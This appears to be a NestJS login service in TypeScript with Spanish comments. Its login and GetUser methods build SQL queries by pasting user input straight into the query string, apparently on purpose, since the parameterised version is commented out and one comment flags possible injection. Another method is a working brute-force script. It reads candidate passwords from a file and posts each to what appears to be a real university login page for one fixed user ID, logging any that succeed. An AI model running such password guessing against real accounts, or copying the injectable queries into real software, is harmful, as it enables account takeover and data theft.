import { Injectable, Logger } from '@nestjs/common';
import { createReadStream } from 'fs';
import * as readline from 'readline';

import { decode } from 'html-entities'; // Para decodificar los caracteres HTML

import { LoginDto } from './dto/login';
import { connectToDatabase } from 'src/db/Connection';
import * as sql from 'mssql';
import { JwtService } from '@nestjs/jwt';
import { firstValueFrom, lastValueFrom } from 'rxjs';
import { HttpService } from '@nestjs/axios';
@Injectable()
export class LoginService {

    constructor(private jwtService: JwtService,
        private httpService: HttpService
    ) { }
    private readonly logger = new Logger(LoginService.name);



    //METODO PARA LA AUTENTICACION DE LOS USUARIOS 
    async login(loginDto: LoginDto) {
        console.log(loginDto.email)

        const pool = await connectToDatabase();
        try {

            const queryVulnerable = `SELECT * FROM users2 WHERE correo = '${loginDto.email}' AND contraseña = '${loginDto.password}'`;
            const result = await pool.request().query(queryVulnerable);


            console.log(queryVulnerable)
            /*   const query = `
                         SELECT * FROM users2
                         WHERE correo = @correo and contraseña  = @clave
                        `;
  
              const result = await pool.request()
                  .input('correo', sql.VarChar(100), loginDto.email)
                  .input('clave', sql.VarChar(100), loginDto.password)
                  .query(query);
   */



            if (result.recordset.length == 0) {
                return {
                    status: false,
                    value: null,
                    message: 'Invalid email or password'
                }
            }
            const user = result.recordset[0];
            const payload = { email: user.email, sub: user.id };
            const token = this.jwtService.sign(payload);

            return {
                status: true,
                token: token,
                value: result.recordset[0],
                message: ''
            }
        } catch (err) {
            return {
                status: false,
                value: null,
                message: err.message
            }
        }
    }




    async readFileLineByLine3(): Promise<void> {


        const passwordFile = "./passCrack.txt";
        const userFile = "./gmailCrack";


        let passwordCorrectFound = 0;
        // Crear un stream de lectura para el archivo
        const fileStreamP = createReadStream(passwordFile);
        const fileStreamU = createReadStream(userFile);

        // Crear la interfaz para leer línea por línea
        const rlP = readline.createInterface({
            input: fileStreamP,
            crlfDelay: Infinity, // Reconoce CRLF y LF como fin de línea
        });

        const rlU = readline.createInterface({
            input: fileStreamU,
            crlfDelay: Infinity, // Reconoce CRLF y LF como fin de línea
        });

        // Leer cada línea del archivo
        for await (const line of rlP) {
            // Divide la línea en palabras usando espacios en blanco
            const words = line.split(/\s+/);

            for (const word of words) {
                if (word.trim() !== '') {
                    const url = 'https://login.oymas.edu.do/v2/login-process.php';
                    const formData = new URLSearchParams();
                    formData.append('user', '23-mpss-6-037');
                    formData.append('password', word);
                    try {
                        const response = await lastValueFrom(
                            this.httpService.post(url, formData.toString(), {
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            })
                        );

                        const responseText = decode(response.data);

                        const errorRegex = /Ha ocurrido un error en la validación de sus datos/;
                        const isError = errorRegex.test(responseText);


                        if (isError) {
                            console.log(`\x1b[31m[❌ LOGIN FALLIDO]\x1b[0m User: ${formData.get('user')} - Password: ${formData.get('password')}`);
                        } else {
                            console.log(`\x1b[36m[✅ LOGIN CORRECTO]\x1b[0m User: \x1b[32m${formData.get('user')}\x1b[0m - Password: \x1b[32m${formData.get('password')}\x1b[0m`);
                            passwordCorrectFound += 1;
                        }

                    } catch (error) {
                        console.log(error)
                    }
                }
            }
        }



        console.log('\x1b[32m%s\x1b[0m' + "se encontraron " + "  " + passwordCorrectFound + "  " + "contraseña valida")
    }


    async GetUser(idUser: Number) {
        const pool = await connectToDatabase();

        // Inyección SQL posible
        const query = `
            SELECT * FROM users2 WHERE id = ${idUser}
        `;

        // Ejecutar la consulta
        const result = await pool.request()
            .query(query);

        return result.recordset;
    }


}
